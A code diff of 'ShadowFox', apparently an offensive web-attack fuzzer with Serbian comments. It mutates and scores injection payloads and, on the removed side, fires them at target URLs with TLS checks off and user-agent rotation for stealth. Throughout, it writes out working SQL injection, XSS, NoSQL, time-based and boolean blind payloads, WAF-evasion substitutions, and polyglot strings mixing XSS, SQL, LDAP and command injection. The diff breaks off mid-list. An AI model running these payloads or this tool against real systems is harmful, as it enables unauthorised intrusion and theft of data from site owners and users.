@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-🧬 SHADOWFOX MUTATOR CORE MODULE
-Laboratorija - Mutacije i AI analiza
+🧬 SHADOWFOX MUTATION CORE - UNIVERZALNI AI FUZZER
+Napredno mutiranje payload-a sa AI evaluacijom i skalabilnim strategijama
 Autor: Whitefox980 | Verzija: 2025.06.06
 """
 
@@ -9,737 +9,680 @@ import requests
 import json
 import time
 import random
-import string
-import base64
-import urllib.parse
 import hashlib
+import urllib.parse
+import base64
+import html
 import re
-from itertools import combinations, permutations
+from typing import Dict, List, Any, Tuple
 import warnings
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-class ShadowMutatorCore:
+class MutationCore:
     def __init__(self):
         self.session = requests.Session()
         self.meta_config = {}
-        self.recon_data = {}
-        self.attack_data = {}
-        self.results = {
+        self.source_payloads = []
+        self.mutation_results = {
             "mission_info": {},
-            "mutation_summary": {},
-            "generated_payloads": [],
+            "source_analysis": {},
+            "mutated_payloads": [],
+            "top_ai_scored_payloads": [],
             "mutation_tests": [],
-            "ai_evaluations": [],
             "high_score_payloads": [],
-            "context_aware_mutations": [],
-            "evasion_techniques": [],
-            "statistics": {}
+            "mutation_statistics": {}
         }
         
-        # Mutation engines
-        self.mutation_engines = [
-            "encoding_mutations",
-            "case_mutations", 
-            "concatenation_mutations",
-            "context_mutations",
-            "evasion_mutations",
-            "polyglot_mutations",
-            "time_based_mutations",
-            "blind_mutations"
-        ]
-        
-        # Encoding techniques
-        self.encodings = {
-            "url": urllib.parse.quote,
-            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
-            "html": lambda x: ''.join(f'&#{ord(c)};' for c in x),
-            "base64": lambda x: base64.b64encode(x.encode()).decode(),
-            "hex": lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
-            "unicode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
+        # Mutation strategije - skalabilan dizajn
+        self.mutation_strategies = {
+            "encoding": self._encoding_mutations,
+            "evasive": self._evasive_mutations,
+            "polyglot": self._polyglot_mutations,
+            "contextual": self._contextual_mutations,
+            "blind": self._blind_mutations,
+            "advanced": self._advanced_mutations
         }
         
-    def load_dependencies(self):
-        """Učitava Meta config, Recon i Attack podatke"""
+        # AI scoring faktori
+        self.scoring_factors = {
+            "HTTP_SUCCESS": 3,
+            "ADMIN_REFERENCE": 5,
+            "NO_UNAUTHORIZED_ERROR": 4,
+            "TOKEN_REFERENCE": 4,
+            "DASHBOARD_REFERENCE": 3,
+            "ERROR_DISCLOSURE": 2,
+            "REFLECTION_FOUND": 6,
+            "TIMING_ANOMALY": 3
+        }
+        
+    def load_meta_config(self):
+        """Učitava Meta konfiguraciju misije"""
         try:
-            # Meta config
             with open('Meta/mission_info.json', 'r') as f:
                 self.meta_config = json.load(f)
-                self.results["mission_info"] = self.meta_config
-                
-            # Recon podaci
-            with open('ShadowRecon/shadow_recon.json', 'r') as f:
-                self.recon_data = json.load(f)
-                
-            # Attack podaci
-            with open('Napad/attack_param_fuzz.json', 'r') as f:
-                self.attack_data = json.load(f)
-                
-            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
-            print(f"🎯 [DEPS] Učitano: Recon + Attack podatke")
-            
-        except FileNotFoundError as e:
-            print(f"❌ [ERROR] Nedostaje dependency: {str(e)}")
-            print("🔧 [FIX] Pokreni ShadowRecon i Attack module prvo!")
+                self.mutation_results["mission_info"] = self.meta_config
+                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
+        except FileNotFoundError:
+            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
             exit(1)
             
-    def setup_session(self):
-        """Konfiguracija sesije"""
-        headers = self.meta_config.get('default_headers', {})
-        self.session.headers.update(headers)
+    def load_source_payloads(self):
+        """Učitava payload-e iz različitih izvora sa prioritetom"""
+        source_files = [
+            ('Napad/attack_param_fuzz.json', 'param_fuzz'),
+            ('AdvanceNapad/prototype_pollution_results.json', 'prototype_pollution'),
+            ('Napad/rce_payloads.json', 'rce_payloads'),
+            ('Napad/attack_header_fuzz.json', 'header_fuzz'),
+            ('Napad/attack_jwt_fuzz.json', 'jwt_fuzz'),
+            ('ShadowRecon/shadow_recon.json', 'recon_data')
+        ]
         
-        if self.meta_config.get('stealth_mode', False):
-            user_agents = [
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
-            ]
-            self.session.headers['User-Agent'] = random.choice(user_agents)
-            
-        self.session.verify = False
-        self.session.timeout = 15
+        loaded_sources = {}
+        total_payloads = 0
         
-    def intelligent_delay(self):
-        """Pametno kašnjenje"""
-        if self.meta_config.get('stealth_mode', False):
-            delay = self.meta_config.get('rate_delay_seconds', 2.5)
-            time.sleep(delay + random.uniform(0, 1))
-        else:
-            time.sleep(random.uniform(0.1, 0.3))
-            
-    def encoding_mutations(self, payload):
-        """Generisanje encoding mutacija"""
-        mutations = []
-        
-        for encoding_name, encoding_func in self.encodings.items():
+        for file_path, source_type in source_files:
             try:
-                mutated = encoding_func(payload)
-                mutations.append({
-                    "original": payload,
-                    "mutated": mutated,
-                    "technique": f"encoding_{encoding_name}",
-                    "category": "encoding"
-                })
+                with open(file_path, 'r') as f:
+                    data = json.load(f)
+                    payloads = self._extract_payloads_from_source(data, source_type)
+                    if payloads:
+                        loaded_sources[source_type] = payloads
+                        total_payloads += len(payloads)
+                        print(f"📄 [SOURCE] {source_type}: {len(payloads)} payloada")
+            except FileNotFoundError:
+                print(f"⚠️  [WARNING] {file_path} nije pronađen")
+                
+        self.mutation_results["source_analysis"] = {
+            "sources_loaded": list(loaded_sources.keys()),
+            "total_source_payloads": total_payloads,
+            "load_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        # Prioritizacija payload-a
+        self.source_payloads = self._prioritize_payloads(loaded_sources)
+        print(f"🎯 [SELECTION] {len(self.source_payloads)} validnih payloada za mutaciju")
+        
+    def _extract_payloads_from_source(self, data: Dict, source_type: str) -> List[Dict]:
+        """Ekstraktuje payload-e iz različitih tipova izvora"""
+        payloads = []
+        
+        if source_type == 'prototype_pollution':
+            # Prioritet: confirmed_pollution > injection_results
+            confirmed = data.get('confirmed_pollution', [])
+            if confirmed:
+                for item in confirmed:
+                    payloads.append({
+                        "endpoint": item.get('endpoint', ''),
+                        "method": item.get('method', 'GET'),
+                        "payload": item.get('payload', ''),
+                        "params": item.get('params', {}),
+                        "headers": item.get('headers', {}),
+                        "source_type": source_type,
+                        "priority": "HIGH",
+                        "success_indicators": item.get('success_indicators', [])
+                    })
+            else:
+                injection_results = data.get('injection_results', [])
+                for item in injection_results:
+                    if item.get('success_indicators'):
+                        payloads.append({
+                            "endpoint": item.get('endpoint', ''),
+                            "method": item.get('method', 'GET'),
+                            "payload": item.get('payload', ''),
+                            "params": item.get('params', {}),
+                            "headers": item.get('headers', {}),
+                            "source_type": source_type,
+                            "priority": "MEDIUM",
+                            "success_indicators": item.get('success_indicators', [])
+                        })
+                        
+        elif source_type == 'param_fuzz':
+            fuzz_results = data.get('fuzz_results', [])
+            for item in fuzz_results:
+                if item.get('success_indicators') or item.get('status_code') == 200:
+                    payloads.append({
+                        "endpoint": item.get('endpoint', ''),
+                        "method": item.get('method', 'GET'),
+                        "payload": item.get('payload', ''),
+                        "params": item.get('params', {}),
+                        "headers": item.get('headers', {}),
+                        "source_type": source_type,
+                        "priority": "MEDIUM",
+                        "success_indicators": item.get('success_indicators', [])
+                    })
+                    
+        elif source_type == 'rce_payloads':
+            rce_tests = data.get('rce_tests', [])
+            for item in rce_tests:
+                if item.get('response_analysis', {}).get('potential_rce', False):
+                    payloads.append({
+                        "endpoint": item.get('endpoint', ''),
+                        "method": item.get('method', 'POST'),
+                        "payload": item.get('payload', ''),
+                        "params": item.get('params', {}),
+                        "headers": item.get('headers', {}),
+                        "source_type": source_type,
+                        "priority": "CRITICAL",
+                        "success_indicators": ["RCE_POTENTIAL"]
+                    })
+                    
+        elif source_type == 'recon_data':
+            # Koristi recon podatke za kreiranje osnovnih payloada
+            params = data.get('discovered_parameters', {})
+            endpoints = data.get('discovered_endpoints', [])
+            
+            for endpoint_info in endpoints[:10]:  # Limit na 10 najinteresantnijih
+                if endpoint_info.get('status_code') == 200:
+                    payloads.append({
+                        "endpoint": endpoint_info.get('url', ''),
+                        "method": "GET",
+                        "payload": "",
+                        "params": {},
+                        "headers": {},
+                        "source_type": source_type,
+                        "priority": "LOW",
+                        "success_indicators": ["ACCESSIBLE_ENDPOINT"]
+                    })
+                    
+        return payloads
+        
+    def _prioritize_payloads(self, loaded_sources: Dict) -> List[Dict]:
+        """Prioritizacija payload-a na osnovu uspešnosti i tipa"""
+        all_payloads = []
+        
+        # Dodeli priority score
+        for source_type, payloads in loaded_sources.items():
+            for payload in payloads:
+                priority_score = 0
+                
+                # Priority na osnovu tipa izvora
+                if payload["priority"] == "CRITICAL":
+                    priority_score += 10
+                elif payload["priority"] == "HIGH":
+                    priority_score += 8
+                elif payload["priority"] == "MEDIUM":
+                    priority_score += 5
+                else:
+                    priority_score += 2
+                    
+                # Bonus za success indicators
+                success_indicators = payload.get("success_indicators", [])
+                priority_score += len(success_indicators) * 2
+                
+                # Bonus za specifične indikatore
+                if "REFLECTION_FOUND" in success_indicators:
+                    priority_score += 5
+                if "ADMIN_REFERENCE" in success_indicators:
+                    priority_score += 4
+                if "TOKEN_REFERENCE" in success_indicators:
+                    priority_score += 3
+                    
+                payload["priority_score"] = priority_score
+                all_payloads.append(payload)
+                
+        # Sortiraj po priority score i vrati top payload-e
+        all_payloads.sort(key=lambda x: x["priority_score"], reverse=True)
+        return all_payloads[:50]  # Limit na 50 najboljih
+        
+    def generate_mutations(self) -> List[Dict]:
+        """Generiše mutacije za sve validne payload-e"""
+        all_mutations = []
+        
+        print("🧬 [MUTATION] Pokretanje mutacijskih strategija...")
+        
+        for payload in self.source_payloads:
+            base_payload = payload.get("payload", "")
+            if not base_payload:
+                continue
+                
+            base_payload_str = str(base_payload) if not isinstance(base_payload, str) else base_payload
+            print(f"🔬 [MUTATE] {payload['source_type']}: {base_payload_str[:50]}...")
+            
+            # Primeni sve mutation strategije
+            for strategy_name, strategy_func in self.mutation_strategies.items():
+                try:
+                    mutations = strategy_func(payload)
+                    for mutation in mutations:
+                        mutation["mutation_strategy"] = strategy_name
+                        mutation["original_payload"] = payload
+                        all_mutations.append(mutation)
+                except Exception as e:
+                    print(f"❌ [MUTATION ERROR] {strategy_name}: {str(e)}")
+                    
+        print(f"🧬 [MUTATION] Generisano {len(all_mutations)} mutacija")
+        return all_mutations
+        
+    def _encoding_mutations(self, payload: Dict) -> List[Dict]:
+        """Encoding mutation strategije"""
+        mutations = []
+        base_payload = payload.get("payload", "")
+        
+        encoding_strategies = [
+            ("url_encode", lambda x: urllib.parse.quote(x)),
+            ("double_url_encode", lambda x: urllib.parse.quote(urllib.parse.quote(x))),
+            ("html_encode", lambda x: html.escape(x)),
+            ("base64_encode", lambda x: base64.b64encode(x.encode()).decode()),
+            ("hex_encode", lambda x: ''.join(f'%{ord(c):02x}' for c in x)),
+            ("unicode_encode", lambda x: ''.join(f'\\u{ord(c):04x}' for c in x if ord(c) > 127) or x)
+        ]
+        
+        for strategy_name, encode_func in encoding_strategies:
+            try:
+                mutated_payload = encode_func(base_payload)
+                mutation = payload.copy()
+                mutation["payload"] = mutated_payload
+                mutation["mutation_type"] = strategy_name
+                mutations.append(mutation)
             except Exception:
                 continue
                 
-        # Mixed encoding mutations
-        for i in range(3):  # 3 random mixed encodings
-            mixed_payload = payload
-            techniques_used = []
-            
-            for _ in range(random.randint(2, 4)):
-                encoding_name = random.choice(list(self.encodings.keys()))
-                try:
-                    mixed_payload = self.encodings[encoding_name](mixed_payload)
-                    techniques_used.append(encoding_name)
-                except Exception:
-                    continue
-                    
-            if techniques_used:
-                mutations.append({
-                    "original": payload,
-                    "mutated": mixed_payload,
-                    "technique": f"mixed_encoding_{'_'.join(techniques_used)}",
-                    "category": "encoding"
-                })
-                
         return mutations
         
-    def case_mutations(self, payload):
-        """Case manipulation mutacije"""
+    def _evasive_mutations(self, payload: Dict) -> List[Dict]:
+        """Evasive mutation strategije za zaobilaženje filtera"""
         mutations = []
+        base_payload = payload.get("payload", "")
         
-        # Random case variations
-        variations = [
-            payload.upper(),
-            payload.lower(),
-            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)),
-            ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload)),
-            ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
+        evasive_strategies = [
+            # Case variations
+            ("case_mix", lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x))),
+            # Comment injection
+            ("sql_comment", lambda x: x.replace(" ", "/**/") if "'" in x or "SELECT" in x.upper() else x),
+            # Space alternatives
+            ("tab_spaces", lambda x: x.replace(" ", "\t")),
+            ("plus_spaces", lambda x: x.replace(" ", "+")),
+            # Null byte injection
+            ("null_byte", lambda x: x + "%00"),
+            # Line break injection
+            ("line_breaks", lambda x: x.replace(";", ";\n")),
         ]
         
-        for i, variation in enumerate(variations):
-            if variation != payload:
-                mutations.append({
-                    "original": payload,
-                    "mutated": variation,
-                    "technique": f"case_variation_{i}",
-                    "category": "case"
-                })
-                
-        return mutations
-        
-    def concatenation_mutations(self, payload):
-        """Concatenation i comment injection mutacije"""
-        mutations = []
-        
-        # SQL comment variations
-        sql_comments = ["--", "/*", "*/", "#", ";"]
-        for comment in sql_comments:
-            mutations.extend([
-                {
-                    "original": payload,
-                    "mutated": f"{payload}{comment}",
-                    "technique": f"sql_comment_{comment}",
-                    "category": "concatenation"
-                },
-                {
-                    "original": payload,
-                    "mutated": f"{comment}{payload}",
-                    "technique": f"sql_prefix_{comment}",
-                    "category": "concatenation"
-                }
-            ])
-            
-        # Null byte variations
-        null_variations = ["%00", "\\0", "\x00", "%0a", "%0d"]
-        for null_var in null_variations:
-            mutations.extend([
-                {
-                    "original": payload,
-                    "mutated": f"{payload}{null_var}",
-                    "technique": f"null_suffix_{null_var}",
-                    "category": "concatenation"
-                },
-                {
-                    "original": payload,
-                    "mutated": f"{null_var}{payload}",
-                    "technique": f"null_prefix_{null_var}",
-                    "category": "concatenation"
-                }
-            ])
-            
-        # Whitespace variations
-        whitespace_chars = [" ", "\\t", "\\n", "\\r", "+", "%20", "%09", "%0a", "%0d"]
-        for ws in whitespace_chars:
-            # Insert whitespace in random positions
-            for _ in range(2):
-                pos = random.randint(1, len(payload) - 1)
-                mutated = payload[:pos] + ws + payload[pos:]
-                mutations.append({
-                    "original": payload,
-                    "mutated": mutated,
-                    "technique": f"whitespace_injection_{ws}",
-                    "category": "concatenation"
-                })
-                
-        return mutations
-        
-    def context_mutations(self, payload, context_info):
-        """Context-aware mutacije na osnovu context-a"""
-        mutations = []
-        
-        # Ako je payload za SQL context
-        if any(sql_keyword in payload.lower() for sql_keyword in ["select", "union", "where", "or", "and"]):
-            sql_contexts = [
-                f"1{payload}",
-                f"admin{payload}",
-                f"'{payload}",
-                f"\"{payload}",
-                f")){payload}",
-                f"]{payload}",
-                f"1' {payload} --",
-                f"1\" {payload} #"
-            ]
-            
-            for context in sql_contexts:
-                mutations.append({
-                    "original": payload,
-                    "mutated": context,
-                    "technique": "sql_context_wrap",
-                    "category": "context",
-                    "context_type": "sql"
-                })
-                
-        # Ako je payload za XSS context
-        if any(xss_keyword in payload.lower() for xss_keyword in ["script", "alert", "onerror", "onload"]):
-            xss_contexts = [
-                f"'>{payload}",
-                f"\">{payload}",
-                f"</title>{payload}",
-                f"</script>{payload}",
-                f"';{payload}//",
-                f"\";{payload}//",
-                f"</textarea>{payload}",
-                f"</style>{payload}"
-            ]
-            
-            for context in xss_contexts:
-                mutations.append({
-                    "original": payload,
-                    "mutated": context,
-                    "technique": "xss_context_escape",
-                    "category": "context",
-                    "context_type": "xss"
-                })
-                
-        return mutations
-        
-    def evasion_mutations(self, payload):
-        """WAF evasion mutacije"""
-        mutations = []
-        
-        # Character substitution for WAF evasion
-        evasion_subs = {
-            "select": ["sel/**/ect", "SeLeCt", "s%65lect", "se\x6Cect"],
-            "union": ["uni/**/on", "UnIoN", "u%6Eion", "un\x69on"],
-            "script": ["scr/**/ipt", "ScRiPt", "s%63ript", "scr\x69pt"],
-            "alert": ["al/**/ert", "AlErT", "a%6Cert", "al\x65rt"],
-            "or": ["||", "or/**/", "O/**/R", "%6Fr"],
-            "and": ["&&", "and/**/", "A/**/ND", "%61nd"]
-        }
-        
-        mutated_payload = payload
-        techniques_used = []
-        
-        for original, substitutions in evasion_subs.items():
-            if original in payload.lower():
-                chosen_sub = random.choice(substitutions)
-                mutated_payload = re.sub(re.escape(original), chosen_sub, mutated_payload, flags=re.IGNORECASE)
-                techniques_used.append(f"sub_{original}")
-                
-        if techniques_used:
-            mutations.append({
-                "original": payload,
-                "mutated": mutated_payload,
-                "technique": f"waf_evasion_{'_'.join(techniques_used)}",
-                "category": "evasion"
-            })
-            
-        # Double encoding for WAF bypass
-        double_encoded = payload
-        for _ in range(2):
-            double_encoded = urllib.parse.quote(double_encoded)
-            
-        mutations.append({
-            "original": payload,
-            "mutated": double_encoded,
-            "technique": "double_url_encoding",
-            "category": "evasion"
-        })
-        
-        # Mixed case with comments
-        mixed_case_comments = payload
-        for i in range(0, len(payload), 3):
-            if i < len(mixed_case_comments):
-                mixed_case_comments = (mixed_case_comments[:i] + 
-                                     "/*" + mixed_case_comments[i].upper() + "*/" + 
-                                     mixed_case_comments[i+1:])
-                
-        mutations.append({
-            "original": payload,
-            "mutated": mixed_case_comments,
-            "technique": "mixed_case_comments",
-            "category": "evasion"
-        })
-        
-        return mutations
-        
-    def polyglot_mutations(self, payload):
-        """Polyglot payload generisanje"""
-        mutations = []
-        
-        # Multi-context polyglots
-        polyglot_templates = [
-            "';{payload}//",
-            "\";{payload}//", 
-            "'><{payload}>",
-            "\"><{payload}>",
-            "';{payload}/*",
-            "*/alert('{payload}')/*",
-            "{{7*7}}{payload}{{/if}}",
-            "${{{payload}}}",
-            "<%={payload}%>",
-            "#{{{payload}}}"
-        ]
-        
-        for template in polyglot_templates:
-            mutated = template.format(payload=payload)
-            mutations.append({
-                "original": payload,
-                "mutated": mutated,
-                "technique": f"polyglot_{template[:10]}",
-                "category": "polyglot"
-            })
-            
-        # Advanced polyglots
-        advanced_polyglots = [
-            f"'{payload}/**/OR/**/1=1--",
-            f"\"><script>alert('{payload}')</script>",
-            f"{{{{7*7}}}}{payload}{{{{/if}}}}",
-            f"';{payload};waitfor/**/delay/**/'0:0:5'--",
-            f"\">{payload}<script>alert(String.fromCharCode(88,83,83))</script>"
-        ]
-        
-        for polyglot in advanced_polyglots:
-            mutations.append({
-                "original": payload,
-                "mutated": polyglot,
-                "technique": "advanced_polyglot",
-                "category": "polyglot"
-            })
-            
-        return mutations
-        
-    def time_based_mutations(self, payload):
-        """Time-based blind injection mutacije"""
-        mutations = []
-        
-        # SQL time-based
-        sql_time_payloads = [
-            f"{payload};waitfor delay '0:0:5'--",
-            f"{payload} AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            f"{payload}' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
-            f"{payload}\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND \"a\"=\"a",
-            f"{payload};SELECT pg_sleep(5)--",
-            f"{payload}' AND pg_sleep(5)--"
-        ]
-        
-        for time_payload in sql_time_payloads:
-            mutations.append({
-                "original": payload,
-                "mutated": time_payload,
-                "technique": "sql_time_based",
-                "category": "time_based",
-                "expected_delay": 5
-            })
-            
-        # NoSQL time-based
-        nosql_time_payloads = [
-            f"{payload}';return (function(){{var d=new Date();do{{var cd=new Date();}}while(cd-d<5000);return true;}})();//",
-            f"{payload}\";return (function(){{var d=new Date();do{{var cd=new Date();}}while(cd-d<5000);return true;}})();//"
-        ]
-        
-        for time_payload in nosql_time_payloads:
-            mutations.append({
-                "original": payload,
-                "mutated": time_payload,
-                "technique": "nosql_time_based",
-                "category": "time_based",
-                "expected_delay": 5
-            })
-            
-        return mutations
-        
-    def blind_mutations(self, payload):
-        """Blind injection mutacije"""
-        mutations = []
-        
-        # Boolean-based blind
-        boolean_conditions = [
-            " AND 1=1",
-            " AND 1=2",
-            " OR 1=1",
-            " OR 1=2",
-            "' AND '1'='1",
-            "' AND '1'='2",
-            "\" AND \"1\"=\"1",
-            "\" AND \"1\"=\"2"
-        ]
-        
-        for condition in boolean_conditions:
-            mutations.append({
-                "original": payload,
-                "mutated": f"{payload}{condition}",
-                "technique": "boolean_blind",
-                "category": "blind",
-                "condition_type": "true" if "1=1" in condition or "'1'='1" in condition else "false"
-            })
-            
-        # Length-based detection
-        length_payloads = [
-            f"{payload}' AND LENGTH(database())>0--",
-            f"{payload}' AND LENGTH(USER())>5--",
-            f"{payload}' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>0--"
-        ]
-        
-        for length_payload in length_payloads:
-            mutations.append({
-                "original": payload,
-                "mutated": length_payload,
-                "technique": "length_based_blind",
-                "category": "blind"
-            })
-            
-        return mutations
-        
-    def generate_mutations(self, payload_data):
-        """Glavni generator mutacija"""
-        print(f"🧬 [MUTATE] Payload: {payload_data.get('payload', 'Unknown')[:30]}...")
-        
-        original_payload = payload_data.get('payload', '')
-        payload_category = payload_data.get('payload_category', 'unknown')
-        
-        all_mutations = []
-        
-        # Primeni sve mutation engine-e
-        for engine_name in self.mutation_engines:
-            engine_method = getattr(self, engine_name, None)
-            if engine_method:
-                try:
-                    if engine_name == "context_mutations":
-                        mutations = engine_method(original_payload, payload_data)
-                    else:
-                        mutations = engine_method(original_payload)
-                    all_mutations.extend(mutations)
-                except Exception as e:
-                    print(f"   ❌ [MUTATION ERROR] {engine_name}: {str(e)}")
-                    
-        # Dodaj metadata u mutacije
-        for mutation in all_mutations:
-            mutation.update({
-                "original_category": payload_category,
-                "mutation_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-                "target_parameter": payload_data.get('parameter'),
-                "source_url": payload_data.get('url')
-            })
-            
-        print(f"   ✅ Generisano {len(all_mutations)} mutacija")
-        return all_mutations
-        
-    def test_mutations(self, mutations, original_context):
-        """Test mutiranih payload-a"""
-        tested_mutations = []
-        
-        for mutation in mutations[:50]:  # Limit za testiranje
-            self.intelligent_delay()
-            
-            mutated_payload = mutation.get('mutated', '')
-            param_name = original_context.get('parameter')
-            base_url = original_context.get('url')
-            method = original_context.get('method', 'GET')
-            
-            if not all([mutated_payload, param_name, base_url]):
+        for strategy_name, mutate_func in evasive_strategies:
+            try:
+                mutated_payload = mutate_func(base_payload)
+                if mutated_payload != base_payload:  # Samo ako je drugačiji
+                    mutation = payload.copy()
+                    mutation["payload"] = mutated_payload
+                    mutation["mutation_type"] = strategy_name
+                    mutations.append(mutation)
+            except Exception:
                 continue
                 
-            try:
-                test_params = {param_name: mutated_payload}
-                
-                start_time = time.time()
-                if method.upper() == 'GET':
-                    response = self.session.get(base_url, params=test_params)
-                else:
-                    response = self.session.post(base_url, data=test_params)
-                response_time = time.time() - start_time
-                
-                # Osnovni response analiza
-                mutation_result = {
-                    **mutation,
-                    "test_results": {
-                        "status_code": response.status_code,
-                        "response_length": len(response.text),
-                        "response_time": response_time,
-                        "contains_payload": mutated_payload in response.text,
-                        "contains_original": mutation.get('original', '') in response.text,
-                        "response_hash": hashlib.md5(response.text.encode()).hexdigest()
-                    }
-                }
-                
-                tested_mutations.append(mutation_result)
-                
-            except Exception as e:
-                print(f"   ❌ [TEST ERROR] {str(e)}")
-                
-        return tested_mutations
+        return mutations
         
-    def ai_score_payload(self, mutation_data):
-        """AI scoring sistema za payload efikasnost"""
-        score = 0.0
-        factors = []
+    def _polyglot_mutations(self, payload: Dict) -> List[Dict]:
+        """Polyglot payload mutacije - kombinacija različitih injection tipova"""
+        mutations = []
+        base_payload = payload.get("payload", "")
         
-        test_results = mutation_data.get('test_results', {})
-        
-        # Response time factor (time-based detection)
-        response_time = test_results.get('response_time', 0)
-        if response_time > 5 and mutation_data.get('category') == 'time_based':
-            score += 2.0
-            factors.append("time_delay_detected")
-            
-        # Status code changes
-        status_code = test_results.get('status_code', 200)
-        if status_code in [500, 403, 404]:
-            score += 1.0
-            factors.append(f"status_{status_code}")
-            
-        # Payload reflection
-        if test_results.get('contains_payload', False):
-            score += 1.5
-            factors.append("payload_reflected")
-            
-        # Response length anomalies
-        response_length = test_results.get('response_length', 0)
-        if response_length > 10000:  # Unusually long response
-            score += 1.0
-            factors.append("long_response")
-        elif response_length < 100:  # Unusually short response
-            score += 0.5
-            factors.append("short_response")
-            
-        # Technique sophistication bonus
-        technique = mutation_data.get('technique', '')
-        if 'polyglot' in technique:
-            score += 0.5
-            factors.append("polyglot_technique")
-        if 'evasion' in technique:
-            score += 0.5
-            factors.append("evasion_technique")
-        if 'encoding' in technique:
-            score += 0.3
-            factors.append("encoding_technique")
-            
-        # Context awareness bonus
-        if mutation_data.get('category') == 'context':
-            score += 0.7
-            factors.append("context_aware")
-            
-        # Penalizuj jednostavne mutacije
-        if mutation_data.get('category') == 'case':
-            score -= 0.2
-            
-        return min(score, 5.0), factors  # Cap na 5.0
-        
-    def evaluate_mutations(self):
-        """AI evaluacija svih testiranih mutacija"""
-        print("🤖 [AI EVAL] Pokretanje AI evaluacije...")
-        
-        high_score_threshold = self.meta_config.get('ai_score_threshold', 3.1)
-        
-        for mutation in self.results["mutation_tests"]:
-            score, factors = self.ai_score_payload(mutation)
-            
-            evaluation = {
-                "mutation_id": mutation.get('technique', 'unknown'),
-                "ai_score": score,
-                "score_factors": factors,
-                "payload": mutation.get('mutated', ''),
-                "original_payload": mutation.get('original', ''),
-                "recommendation": "HIGH_PRIORITY" if score >= high_score_threshold else "LOW_PRIORITY"
-            }
-            
-            self.results["ai_evaluations"].append(evaluation)
-            
-            if score >= high_score_threshold:
-                self.results["high_score_payloads"].append({
-                    **mutation,
-                    "ai_evaluation": evaluation
-                })
-                
-        print(f"   ✅ Evaluirano {len(self.results['ai_evaluations'])} mutacija")
-        print(f"   🏆 High-score payloads: {len(self.results['high_score_payloads'])}")
-        
-    def generate_mutation_summary(self):
-        """Generisanje sažetka mutation operacije"""
-        total_mutations = len(self.results["generated_payloads"])
-        total_tested = len(self.results["mutation_tests"])
-        total_high_score = len(self.results["high_score_payloads"])
-        
-        # Grupiranje po kategorijama
-        mutations_by_category = {}
-        for mutation in self.results["generated_payloads"]:
-            category = mutation.get('category', 'unknown')
-            if category not in mutations_by_category:
-                mutations_by_category[category] = 0
-            mutations_by_category[category] += 1
-            
-        # Top AI score payloads
-        top_payloads = sorted(
-            self.results["ai_evaluations"],
-            key=lambda x: x.get('ai_score', 0),
-            reverse=True
-        )[:10]
-        
-        summary = {
-            "total_mutations_generated": total_mutations,
-            "total_mutations_tested": total_tested,
-            "high_score_mutations": total_high_score,
-            "mutations_by_category": mutations_by_category,
-            "top_ai_scored_payloads": top_payloads,
-            "mutation_engines_used": self.mutation_engines,
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-        }
-        
-        self.results["mutation_summary"] = summary
-        self.results["statistics"] = summary
-        
-    def save_results(self):
-        """Snimanje rezultata u mutator_core.json"""
-        output_file = "Centar/mutator_core.json"
-        
-        try:
-            with open(output_file, 'w') as f:
-                json.dump(self.results, f, indent=2, ensure_ascii=False)
-            print(f"💾 [SAVE] Mutation rezultati snimljeni: {output_file}")
-        except Exception as e:
-            print(f"❌ [SAVE ERROR] {str(e)}")
-            
-    def display_mutation_summary(self):
-        """Prikaz sažetka mutation operacije"""
-        summary = self.results["mutation_summary"]
-        
-        print("\n🧬 SHADOWFOX MUTATOR - SAŽETAK")
-        print("=" * 50)
-        print(f"🔬 Ukupno mutacija: {summary['total_mutations_generated']}")
-        print(f"🧪 Testirano mutacija: {summary['total_mutations_tested']}")
-        print(f"🏆 High-score mutacije: {summary['high_score_mutations']}")
-        
-        print(f"\n📊 MUTACIJE PO KATEGORIJAMA:")
-        for category, count in summary['mutations_by_category'].items():
-            print(f"   • {category}: {count}")
-            
-        if summary['top_ai_scored_payloads']:
-            print(f"\n🎯 TOP AI SCORED PAYLOADS:")
-            for i, payload in enumerate(summary['top_ai_scored_payloads'][:5], 1):
-                print(f"   {i}. Score: {payload['ai_score']:.2f} | {payload['payload'][:50]}...")
-                
-        print(f"\n✅ Rezultati: Centar/mutator_core.json")
-        
-    def run_mutation(self):
-        """Glavna mutation operacija"""
-        print("🧬 SHADOWFOX MUTATOR - POKRETANJE MUTACIJA")
-        print("=" * 50)
-        
-        # 1. Učitaj dependencies
-        self.load_dependencies()
-        
-        # 2. Podesi sesiju
-        self.setup_session()
-        
-        # 3. Uzmi najbolje payload-e iz attack modula
-        injection_results = self.attack_data.get('injection_results', [])
-        vulnerable_payloads = [
-            result for result in injection_results 
-            if result.get('vulnerability_indicators') or result.get('anomalies')
+        polyglot_patterns = [
+            # XSS + SQL Injection
+            f"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+            # SQL + NoSQL + LDAP
+            f"' OR '1'='1' UNION SELECT NULL-- &user=admin)(|(objectClass=*))",
+            # Command Injection + XSS
+            f";echo 'XSS'><script>alert('XSS')</script>",
+            # Prototype Pollution + XSS
